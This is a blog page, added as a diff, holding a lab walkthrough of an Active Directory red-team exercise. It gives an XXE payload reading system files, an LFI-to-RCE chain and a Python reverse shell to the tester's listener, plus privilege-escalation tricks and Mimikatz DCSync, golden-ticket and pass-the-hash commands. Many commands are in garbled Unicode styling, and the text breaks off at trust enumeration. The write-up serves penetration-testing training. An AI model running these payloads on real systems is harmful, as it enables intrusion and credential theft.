@@ -1,0 +1,626 @@
+
+
+  <!DOCTYPE html>
+  <html lang="en" data-default-color-scheme=&#34;dark&#34; >
+  <style>
+    .text1
+    {
+    text-shadow: 0px 0px 2px #f2f3f2;
+    }
+    </style>
+
+  
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/null">
+  <link rel="icon" type="image/png" href="/null">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>攻击链七：域渗透案例四 - whale3070&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body>
+      <header style="height: 70vh;">
+        <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>InfoSec learning</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+          <div class="banner" id="banner" false
+            style="background: url('/img/default.png') no-repeat center center;
+              background-size: cover;">
+              <div class="full-bg-img">
+                <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+                  <div class="page-header text-center fade-in-up">
+                    <span class="h2 text1" id="subtitle" title="攻击链七：域渗透案例四">
+                      
+                        攻击链七：域渗透案例四
+                      
+                    </span>
+        
+                    
+                      <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-06-22 14:16" pubdate>
+        June 22, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      344 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      6
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+                    
+                  </div>
+                    
+                  </div>
+                  
+                </div>
+              </div>
+          </div>
+      </header>
+
+      <main>
+        
+          
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">攻击链七：域渗透案例四</h1>
+            
+            <div class="markdown-body">
+              <p>Red-teaming Active Directory Lab #3 (ELS.CORP) (Attack Path 2)</p>
+<p>Contents<br>Web Server Attack Path (Path 2)</p>
+<p>Prod-SRV . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
+<p>OPS-SRV . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
+<p>ELS-CHILDDC . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
+<p>ELS-DC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
+<p>MGMT-DC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
+<p>JUMP-SRV . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
+<p>Admin-SYS . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
+<p>Scenario<br>You have been asked to execute a (black-box) red teaming exercise against eLS Corp (including any related/trusted forest). The letter of engagement has specified:</p>
+<p>The ADMIN-SYS system as the crown jewel. This means that the ultimate goal of this red teaming exercise is to obtain access to the ADMIN-SYS system.</p>
+<p>That during this exercise, the web application hosted on 172.16.250.2 is included in the scope and you can exploit it to gain initial foothold</p>
+<p>The mail server hosted on 172.16.250.2 is out of scope and should not be touched</p>
+<p>That the pentesters’ network range is 172.16.25.0/24 and a static route has been configured so that pentesters can access the 172.16.250.0/24 network range, where eLS Corp assets exist</p>
+<p>For any cracking activities use the /usr/share/wordlists/rockyou.txt wordlist, included in latest Kali’s</p>
+<p>Hints<br>Refer to the attack path diagram of page 1 only when you are out of options.</p>
+<p>Prod-SRV Server<br>Scanning the accessible IP range from the scope of engagement provides us with two possible entry points both residing on the “172.16.250.2” IP. Specifically, scanning the TCP ports of 172.16.250.2 tells us that an SMTP server and a web application are running on TCP ports 25 and 80. According to the letter of engagement, the SMTP server is out of scope.</p>
+<p>Accessing port 80 through a web browser reveals that a web service is running with a login/registration</p>
+<p>functionality.</p>
+<p>Registering and checking the request and response from the portal suggests that XML technology is used to transfer information from the client to the server. Let’s check if the portal is vulnerable to XML External Entity (XXE) attacks.</p>
+<p>Using the following XXE payload after capturing the request in the web portal leads to internal file disclosure.</p>
+<?xml version="1.0" encoding="UTF−8"?>
+<!DOCTYPE abc [
+<!ENTITY ab SYSTEM "file:///etc/passwd">
+<p>]&gt;</p>
+<p><root><name>&ab;</name><tel>11111111</tel><email><a href="mailto:&#x79;&#x62;&#x40;&#115;&#x71;&#46;&#99;&#x6f;">&#x79;&#x62;&#x40;&#115;&#x71;&#46;&#99;&#x6f;</a></email><password>12345</password></root><br>Through internal file disclosing, sensitive information can easily be obtained (through the XXE vulnerability). For now, we will look for the “/etc/passwd” file.</p>
+<p>A local user named “prod-admin” is clearly visible in the “/etc/passwd” file, let’s enumerate more to see if we can gain some more information about the discovered user.</p>
+<p>Looking at the “.bash_history” file of the “prod-admin” user, another internal file is disclosed which cannot be obtained via directory brute-forcing.</p>
+<?xml version="1.0" encoding="UTF−8"?>
+<!DOCTYPE abc [
+<!ENTITY ab SYSTEM "file:///home/prod-admin/.bash_history">
+<p>]&gt;</p>
+<p><root><name>&ab;</name><tel>11111111</tel><email><a href="mailto:&#121;&#98;&#x40;&#x73;&#113;&#x2e;&#99;&#x6f;">&#121;&#98;&#x40;&#x73;&#113;&#x2e;&#99;&#x6f;</a></email><password>12345</password></root><br>The interesting internal files disclosed are located at ‘/var/www/html/Lab-User.php’ and ‘/var/www/Lab-Admin.php’.</p>
+<p>However, we cannot read the files directly, we will use php filter as our workaround to disclose file contents in base64 format and then convert it to a readable format.</p>
+<p>The content of the “/var/www/html/Lab-User.php” file can be viewed, as follows:</p>
+<p>Copy the Base64 string from the response body of Burp Suite and then use the following command to read the contents in a readable format.</p>
+<p>From the file “/var/www/html/Lab-User.php” an input parameter “page” is disclosed which can be used to include files as parameters in the URL.</p>
+<p>Similarly, the content of the “/var/www/Lab-Admin.php” file can also be viewed using the PHP filter.</p>
+<p>A URL parameter ‘cmd’ is disclosed for command execution inside ‘Lab-Admin.php’</p>
+<p>This means that the file “Lab-User.php” can be used to include another file and the “Lab-Admin.php” file can be used to execute commands.</p>
+<p>Command execution can be achieved, as follows.</p>
+<p>We have successfully exploited the portal through the below vulnerability chain:</p>
+<p>“XXE → LFI → RCE”</p>
+<p>Next step would be to establish a stable reverse shell leveraging RCE for initial access. Use the following command to get a reverse shell from the “Prod-SRV” server.</p>
+<p><a target="_blank" rel="noopener" href="http://172.16.250.2/Lab-User.php?page=../Lab-Admin.php&amp;cmd=python">http://172.16.250.2/Lab-User.php?page=../Lab-Admin.php&amp;cmd=python</a> -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“172.16.25.x”,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);<br>We will be using Metasploit “multi/handler” module to receive the reverse shell.</p>
+<p>use exploit/multi/handler<br>set payload cmd/unix/reverse_python<br>set LHOST <attacking_IP><br>set LPORT <listening_port><br>run -j<br>Reverse shell of Prod-SRV server.</p>
+<p>Neat! We have a shell with ‘www-data’ privileges. Upgrade the session to stable meterpreter session.</p>
+<p>For privilege escalation, “www-data” user can execute “sudo” with “vi” as prod-admin user, this can be checked &amp; abused as follows:</p>
+<p>𝑠ℎ𝑒𝑙𝑙<br>𝑝𝑦𝑡ℎ𝑜𝑛 −𝑐 “𝑖𝑚𝑝𝑜𝑟𝑡 𝑝𝑡𝑦;𝑝𝑡𝑦.𝑠𝑝𝑎𝑤𝑛(‘/𝑏𝑖𝑛/𝑏𝑎𝑠ℎ’);”<br>𝑠𝑢𝑑𝑜 −𝑙</p>
+<p>&lt;𝑅𝑒𝑠𝑢𝑙𝑡&gt;<br>𝑈𝑠𝑒𝑟 𝑤𝑤𝑤−𝑑𝑎𝑡𝑎 𝑚𝑎𝑦 𝑟𝑢𝑛 𝑡ℎ𝑒 𝑓𝑜𝑙𝑙𝑜𝑤𝑖𝑛𝑔 𝑐𝑜𝑚𝑚𝑎𝑛𝑑𝑠 𝑜𝑛 𝑃𝑟𝑜𝑑−𝑆𝑟𝑣:<br>(𝒑𝒓𝒐𝒅−𝒂𝒅𝒎𝒊𝒏) /𝒖𝒔𝒓/𝒃𝒊𝒏/𝒗𝒊, 𝑵𝑶𝑷𝑨𝑺𝑺𝑾𝑫:𝑨𝑳𝑳<br>&lt;/𝑅𝑒𝑠𝑢𝑙𝑡&gt;</p>
+<p>𝑠𝑢𝑑𝑜 −𝑢 𝑝𝑟𝑜𝑑−𝑎𝑑𝑚𝑖𝑛 𝑣𝑖<br>𝑃𝑟𝑒𝑠𝑠 “𝑬𝑺𝑪 +∶ ”<br>!/𝑏𝑖𝑛/𝑠ℎ<br>𝑏𝑎𝑠ℎ −𝑖<br>𝑤ℎ𝑜𝑎𝑚𝑖</p>
+<p>&lt;𝑅𝑒𝑠𝑢𝑙𝑡&gt;<br>𝑷𝒓𝒐𝒅−𝒂𝒅𝒎𝒊𝒏<br>&lt;/𝑅𝑒𝑠𝑢𝑙𝑡&gt;<br>Escalated to “prod-admin” user.</p>
+<p>However, to move forward we need an internal IP address. Interestingly enough, this machine does not have another interface. If you recall, during enumeration we found that the “.bash_history” of the prod-admin user contains links to some log files.</p>
+<p>The “10.10.2.4” IP address can be spotted on the “/var/log/auth.log” file.</p>
+<p>Note: if the log is filled, it is automatically shifted to “/var/log/auth.log.1” or ‘/var/log/auth.log.2’ and so on, check this too if the IP address is not found.</p>
+<p>With the discovered “10.10.2.4” IP address we will add a route to the “10.10.2.0/24” network and start a socks server.</p>
+<p>On meterpreter prompt</p>
+<p>𝑟𝑜𝑢𝑡𝑒 𝑎𝑑𝑑 10.10.2.0/24 &lt;𝑠𝑒𝑠𝑠𝑖𝑜𝑛_𝐼𝐷&gt;<br>𝑟𝑜𝑢𝑡𝑒</p>
+<p>Start SOCKS server<br>𝑢𝑠𝑒 𝑎𝑢𝑥𝑖𝑙𝑖𝑎𝑟𝑦/𝑠𝑒𝑟𝑣𝑒𝑟/𝑠𝑜𝑐𝑘𝑠4𝑎<br>𝑠ℎ𝑜𝑤 𝑜𝑝𝑡𝑖𝑜𝑛𝑠<br>𝑠𝑒𝑡 𝑆𝑅𝑉𝐻𝑂𝑆𝑇 172.16.25.𝑥<br>𝑠𝑒𝑡 𝑆𝑅𝑉𝑃𝑂𝑅𝑇 &lt;𝑙𝑖𝑠𝑡𝑒𝑛𝑖𝑛𝑔_𝑝𝑜𝑟𝑡&gt;<br>𝑟𝑢𝑛 −𝑗</p>
+<p>Modify /etc/proxychains.conf<br>𝑠𝑜𝑐𝑘𝑠4𝑎 172.16.25.𝑥 1080<br>Now, we will scan the TCP ports of the discovered IP address “10.10.2.4”.</p>
+<p>OPS-SRV Server<br>Leveraging the route to the “10.10.2.0/24” network and scanning TCP ports using proxychains reveals that a web server is running on 8080.</p>
+<p>Open Firefox (or any web browser) with proxychains and point the browser to port 8080 of 10.10.2.4</p>
+<p>URL: <a target="_blank" rel="noopener" href="http://10.10.2.4:8080/">http://10.10.2.4:8080</a></p>
+<p>A Jenkins server is running with guessable credentials. Specifically, “admin/admin” is a valid set of username/password.</p>
+<p>After authentication, it is found that the ‘admin’ user has view-only rights. Browsing straight to the credentials store, clear text credentials of “Jenkins-admin” can be been found.</p>
+<p>Browse to:<br><a target="_blank" rel="noopener" href="http://10.10.2.4:8080/">http://10.10.2.4:8080</a></p>
+<p>Authenticate with:<br>𝑎𝑑𝑚𝑖𝑛/𝑎𝑑𝑚𝑖𝑛</p>
+<p>Head straight to the credentials store, the following credentials were found:<br>𝑗𝑒𝑛𝑘𝑖𝑛𝑠−𝑎𝑑𝑚𝑖𝑛\𝐴𝑑𝑚!𝑛@𝐽3𝑛𝑘!𝑛𝑠<br>Logout and login again as “jenkins-admin” using the identified credentials.</p>
+<p>We can establish a shell with the “ops-srv” machine by building and executing a malicious task. In order to do so we will use Metasploit’s “jenkins_script_console” module.</p>
+<p>Configure Exploit:<br>𝑢𝑠𝑒 𝑒𝑥𝑝𝑙𝑜𝑖𝑡/𝑚𝑢𝑙𝑡𝑖/ℎ𝑡𝑡𝑝/𝑗𝑒𝑛𝑘𝑖𝑛𝑠_𝑠𝑐𝑟𝑖𝑝𝑡_𝑐𝑜𝑛𝑠𝑜𝑙𝑒<br>𝑠𝑒𝑡 𝑡𝑎𝑟𝑔𝑒𝑡 1<br>𝑠𝑒𝑡 𝑇𝐴𝑅𝐺𝐸𝑇𝑈𝑅𝐼 /<br>𝑠𝑒𝑡 𝑅𝑃𝑂𝑅𝑇 8080<br>𝑠𝑒𝑡 𝑈𝑆𝐸𝑅𝑁𝐴𝑀𝐸 𝑗𝑒𝑛𝑘𝑖𝑛𝑠−𝑎𝑑𝑚𝑖𝑛<br>𝑠𝑒𝑡 𝑃𝐴𝑆𝑆𝑊𝑂𝑅𝐷 𝐴𝑑𝑚!𝑛@𝐽3𝑛𝑘!𝑛𝑠</p>
+<p>Configure Payload:<br>𝑠𝑒𝑡 𝑝𝑎𝑦𝑙𝑜𝑎𝑑 𝑙𝑖𝑛𝑢𝑥/𝑥86/𝑠ℎ𝑒𝑙𝑙_𝑏𝑖𝑛𝑑_𝑡𝑐𝑝<br>𝑠𝑒𝑡 𝑟ℎ𝑜𝑠𝑡 10.10.2.4<br>𝑠𝑒𝑡 𝑣𝑒𝑟𝑏𝑜𝑠𝑒 𝑡𝑟𝑢𝑒<br>run<br>Executing the module results in a bind shell on “OPS-SRV” server.</p>
+<p>Interestingly, this machine is domain joined which can be confirmed through the presence of a ‘/etc/krb5.conf’ file or successful execution of the command “kinit -k host/$(hostname -f)”.</p>
+<p>With access to the “OPS-SRV” machine we will look for any credentials/tickets that can move us forward. After enumeration, a keytab file is located at “/var/lib/jenkins/support.keytab”.</p>
+<p>But there is a problem… We do not have access to the keytab file because it is owned by another user ‘opsadmin’. We need to somehow become opsadmin or get his privileges.</p>
+<p>Hopefully, during some priv-esc enumeration, a file named “find” was found located at “/var/lib/jenkins/find” which has SUID bit set.</p>
+<p>Check if OPS-SRV is domain joined or not:<br>𝑘𝑖𝑛𝑖𝑡 −𝑘 ℎ𝑜𝑠𝑡/$(ℎ𝑜𝑠𝑡𝑛𝑎𝑚𝑒 −𝑓)</p>
+<p>Keytab file found at:<br>/𝑣𝑎𝑟/𝑙𝑖𝑏/𝑗𝑒𝑛𝑘𝑖𝑛𝑠/𝑠𝑢𝑝𝑝𝑜𝑟𝑡.𝑘𝑒𝑦𝑡𝑎𝑏</p>
+<p>Get opsadmin privileges, SUID check:<br>𝑓𝑖𝑛𝑑 / −𝑝𝑒𝑟𝑚 −𝑢=𝑠 −𝑡𝑦𝑝𝑒 𝑓 2&gt;/𝑑𝑒𝑣/𝑛𝑢𝑙𝑙<br><Result> /𝒗𝒂𝒓/𝒍𝒊𝒃/𝒋𝒆𝒏𝒌𝒊𝒏𝒔/𝒇𝒊𝒏𝒅 </Result><br>Using the file ‘find’, we will change the permissions of ‘support.keytab’ file and request a new ticket.</p>
+<p>Escalate to “opsadmin” user and request a new TGT for support user, as follows.</p>
+<p>Escalation to “opsadmin” user:<br>/𝑣𝑎𝑟/𝑙𝑖𝑏/𝑗𝑒𝑛𝑘𝑖𝑛𝑠/𝑓𝑖𝑛𝑑 𝑎𝑏 −𝑒𝑥𝑒𝑐 𝑐ℎ𝑚𝑜𝑑 777 𝑠𝑢𝑝𝑝𝑜𝑟𝑡.𝑘𝑒𝑦𝑡𝑎𝑏 ;</p>
+<p>Check the permissions of “support.keytab” file:<br>𝑙𝑠 −𝑙𝑎 /𝑣𝑎𝑟/𝑙𝑖𝑏/𝑗𝑒𝑛𝑘𝑖𝑛𝑠/𝑠𝑢𝑝𝑝𝑜𝑟𝑡.𝑘𝑒𝑦𝑡𝑎𝑏</p>
+<p>Request for TGT of support user:<br>𝑘𝑖𝑛𝑖𝑡 −𝑘 −𝑡 𝑠𝑢𝑝𝑝𝑜𝑟𝑡.𝑘𝑒𝑦𝑡𝑎𝑏 𝑠𝑢𝑝𝑝𝑜𝑟𝑡<br>Permissions of “support.keytab” file is changed.</p>
+<p>Now, with enough permissions a TGT related to the “support” domain user can be easily obtained. Let us now request a CIFS ticket for the “support” user, as follows.</p>
+<p>To request a CIFS ticket, use the following and export it back to your attacking machine.</p>
+<p>Request for CIFS Ticket for support user (On OPS-SRV machine):<br>𝑘𝑣𝑛𝑜 𝑐𝑖𝑓𝑠/\𝐸𝐿𝑆−𝐶𝐻𝐼𝐿𝐷𝐷𝐶</p>
+<p>Convert ticket into base64 (On OPS-SRV machine):<br>𝑏𝑎𝑠𝑒64 /𝑡𝑚𝑝/𝑘𝑟𝑏5𝑐𝑐_123</p>
+<p>Copy base64 data and decode in attacker system (On Attacker Machine):<br>𝑏𝑎𝑠𝑒64 −𝑑 𝑘𝑟𝑏5𝑐𝑐_123_b64 &gt; /𝑡𝑚𝑝/𝑘𝑟𝑏5𝑐𝑐_123</p>
+<p>Set Environment variable on attacker machine:<br>𝑒𝑥𝑝𝑜𝑟𝑡 𝐾𝑅𝐵5𝐶𝐶𝑁𝐴𝑀𝐸=/𝑡𝑚𝑝/𝑘𝑟𝑏5𝑐𝑐_123<br>Transferring the ticket using the base64 method and importing it to current environment variable.</p>
+<p>CHILD-DC Server<br>Since we have successfully imported a CIFS ticket related to ELS-CHILDDC in our attacking machine, we can connect to the “ELS-CHILDDC” Domain Controller using the ticket. Also, our meterpreter has a route to the “10.10.2.0/24” network.</p>
+<p>For that we will use impacket’s psexec script, but first we need to add the IP address of ELS-CHILDDC in our hosts file.</p>
+<p>Open /etc/hosts file:<br>10.10.2.2 𝐸𝐿𝑆−𝐶𝐻𝐼𝐿𝐷𝐷𝐶</p>
+<p>Using Impacket’s psexec module, connect to ELS-CHILDDC<br>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑝𝑦𝑡ℎ𝑜𝑛 𝑝𝑠𝑒𝑥𝑒𝑐. 𝑝𝑦 −𝑘 −𝑛𝑜−𝑝𝑎𝑠𝑠 −𝑑𝑒𝑏𝑢𝑔 −𝑑𝑐−𝑖𝑝 10.10.2.2 𝑠𝑢𝑝𝑝𝑜𝑟𝑡@𝐸𝐿𝑆−𝐶𝐻𝐼𝐿𝐷𝐷𝐶</p>
+<p>NOTE: ‘-k’ option to use the active Kerberos ticket<br>In short, we are passing the CIFS ticket to the ELS-CHILDDC server from our attacking machine.</p>
+<p>This will result in a successful and stable session on the ‘ELS-CHILDDC’ Domain Controller.</p>
+<p>We will also use the “PROD-SRV” server to transfer payload from one end to another. Via the meterpreter session on the ‘PROD-SRV’ server upload “Mimikatz.exe” and from that download the file to “ELS-CHILDDC” server.</p>
+<p>On PROD-SRV meterpreter session, upload Mimikatz.exe:<br>𝑢𝑝𝑙𝑜𝑎𝑑 𝑚𝑖𝑚𝑖𝑘𝑎𝑡𝑧.𝑒𝑥𝑒 /𝑡𝑚𝑝/𝑚𝑖𝑚𝑖𝑘𝑎𝑡𝑧.𝑒𝑥𝑒</p>
+<p>Start web server to host payload on PROD-SRV server<br>𝑠ℎ𝑒𝑙𝑙<br>𝑐𝑑 /𝑡𝑚𝑝/<br>𝑙𝑠 −𝑙𝑎 𝑚𝑖𝑚𝑖𝑘𝑎𝑡𝑧.𝑒𝑥𝑒<br>𝑝𝑦𝑡ℎ𝑜𝑛 −𝑚 𝑆𝑖𝑚𝑝𝑙𝑒𝐻𝑇𝑇𝑃𝑆𝑒𝑟𝑣𝑒𝑟 8888</p>
+<p>With Active psexec session on ELS-CHILDDC, download the payload:<br>𝑝𝑜𝑤𝑒𝑟𝑠ℎ𝑒𝑙𝑙.𝑒𝑥𝑒 𝐼𝑛𝑣𝑜𝑘𝑒−𝑊𝑒𝑏𝑅𝑒𝑞𝑢𝑒𝑠𝑡 −𝑈𝑅𝐼 ℎ𝑡𝑡𝑝://172.16.250.2:8888/𝑚𝑖𝑚𝑖𝑘𝑎𝑡𝑧.𝑒𝑥𝑒 −𝑂𝑢𝑡𝐹𝑖𝑙𝑒 𝐶:\𝑈𝑠𝑒𝑟𝑠\𝑃𝑢𝑏𝑙𝑖𝑐\𝑚𝑖𝑚𝑖𝑘𝑎𝑡.𝑒𝑥𝑒<br>Upload Mimikatz.exe:</p>
+<p>Start Python server on “PROD-SRV” server: -</p>
+<p>Downloading, Mimikatz.exe on “ELS-CHILDDC” Domain Controller.</p>
+<p>Our payload is successfully transferred to Child Domain Controller. Now let us forge a golden ticket to escalate to Enterprise Admins of the parent domain.</p>
+<p>However, we will need, the following:</p>
+<p>Krbtgt hash of child DC</p>
+<p>Child Domin SID</p>
+<p>Parent Domain SID</p>
+<p>Current Domain FQDN</p>
+<p>To extract the krbtgt NTLM hash of the “els-childdc” domain, we will perform a DCSync attack.</p>
+<p>𝑚𝑖𝑚𝑖𝑘𝑎𝑡𝑧.𝑒𝑥𝑒<br>𝑙𝑠𝑎𝑑𝑢𝑚𝑝::𝑑𝑐𝑠𝑦𝑛𝑐 /𝑢𝑠𝑒𝑟:𝑒𝑙𝑠−𝑐ℎ𝑖𝑙𝑑\𝑘𝑟𝑏𝑡𝑔𝑡</p>
+<Result>
+𝟐𝟎𝟏𝟕𝒇𝟑𝟖𝒇𝟖𝟗𝟕𝒃𝟏𝟒𝟑𝟖𝒆𝟒𝟗𝟑𝒆𝟐𝒆𝒆𝟓𝟖𝒅𝒃𝟗𝟖𝒄𝟎
+</Result>
+See below the extracted NTLM Hash of 'krbtgt' from the child domain controller. The SID of the child domain can be extracted from the result (without RID part).
+
+
+
+<p>To enumerate the parent SID value, we can use the Active Directory module already present at the domain controller.</p>
+<p>In the psexec session, switch to Power Shell:<br>𝑝𝑜𝑤𝑒𝑟𝑠ℎ𝑒𝑙𝑙<br>𝐼𝑚𝑝𝑜𝑟𝑡−𝑀𝑜𝑑𝑢𝑙𝑒 𝐴𝑐𝑡𝑖𝑣𝑒𝐷𝑖𝑟𝑒𝑐𝑡𝑜𝑟𝑦</p>
+<p>Enumerate Domains present in the Forest (most importantly SID value of parent domain):<br>𝐺𝑒𝑡−𝐴𝐷𝐷𝑜𝑚𝑎𝑖𝑛<br>𝐺𝑒𝑡−𝐴𝐷𝐹𝑜𝑟𝑒𝑠𝑡<br>𝐺𝑒𝑡−𝐴𝐷𝐷𝑜𝑚𝑎𝑖𝑛 𝑒𝑙𝑠.𝑐𝑜𝑟𝑝 (𝑓𝑜𝑟 𝑠𝑖𝑑 𝑜𝑓 𝑒𝑙𝑠.𝑐𝑜𝑟𝑝)<br>SID of Parent Domain Controller [els.corp] discovered:</p>
+<p>We have collected all the info needed to perform a golden ticket attack and cross the domain boundary. Let’s use Mimikatz.exe functionality to create and pass a golden ticket.</p>
+<p>Create &amp; Pass Golden Ticket:<br>𝑘𝑒𝑟𝑏𝑒𝑟𝑜𝑠::𝑔𝑜𝑙𝑑𝑒𝑛 /𝑢𝑠𝑒𝑟:𝑒𝑙𝑠−𝑎𝑑𝑚𝑖𝑛 /𝑑𝑜𝑚𝑎𝑖𝑛:𝑒𝑙𝑠−𝑐ℎ𝑖𝑙𝑑.𝑒𝑙𝑠.𝑐𝑜𝑟𝑝 /𝑠𝑖𝑑:𝑆−1−5−21−3883140795−789752816−1587902789 /𝑘𝑟𝑏𝑡𝑔𝑡:𝟐𝟎𝟏𝟕𝒇𝟑𝟖𝒇𝟖𝟗𝟕𝒃𝟏𝟒𝟑𝟖𝒆𝟒𝟗𝟑𝒆𝟐𝒆𝒆𝟓𝟖𝒅𝒃𝟗𝟖𝒄𝟎 /𝑠𝑖𝑑𝑠:𝑆−1−5−21−286056459−1157968049−2884264478−519 /𝑡𝑖𝑐𝑘𝑒𝑡:𝑡𝑖𝑐𝑘𝑒𝑡.𝑘𝑖𝑟𝑏𝑖</p>
+<p>𝑘𝑒𝑟𝑏𝑒𝑟𝑜𝑠::𝑝𝑡𝑡 𝑡𝑖𝑐𝑘𝑒𝑡.𝑘𝑖𝑟𝑏𝑖<br>Golden Ticket:</p>
+<p>Passing the ticket in active Kerberos session:</p>
+<p>To check if the ticket is successfully passed or not, one can always use the ‘klist’ command. Now, we can access resources of the parent domain and request any service ticket.</p>
+<p>We will also extract the NTLM hash of the Enterprise Administrator of “els.corp” domain (found previously during enumeration activities) using mimikatz.exe</p>
+<p>ELS-DC Server<br>With the credentials of “els-admin” enterprise admin, we can perform psexec on the parent DC server.</p>
+<p>Perform psexec on ELS-DC server:<br>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑝𝑦𝑡ℎ𝑜𝑛 𝑝𝑠𝑒𝑥𝑒𝑐.𝑝𝑦 −𝑑𝑒𝑏𝑢𝑔 −𝑑𝑐−𝑖𝑝 10.10.1.3 𝑒𝑙𝑠−𝑎𝑑𝑚𝑖𝑛@𝐸𝐿𝑆−𝐷𝐶 −ℎ𝑎𝑠ℎ𝑒𝑠 𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒:8645𝑒87𝑒2593507𝑐𝑓623𝑓3291𝑏1334𝑐2<br>“NT Authority\System” at “ELS-DC” parent domain controller.</p>
+<p>Let’s now use the Active-Directory module to perform some enumeration (for abusing a cross-forest trust later on). Switch to PowerShell and load the AD module to enumerate a forest trust.</p>
+<p>Load AD module &amp; perform trust enumeration</p>
+<p>𝐼𝑚𝑝𝑜𝑟𝑡−𝑀𝑜𝑑𝑢𝑙𝑒 𝐴𝑐𝑡𝑖𝑣𝑒𝐷𝑖𝑟𝑒𝑐𝑡𝑜𝑟𝑦<br>𝐺𝑒𝑡−𝐴𝐷𝑇𝑟𝑢𝑠𝑡 −𝐹𝑖𝑙𝑡𝑒𝑟 ∗<br>Output of trust established by the “els.corp” domain.</p>
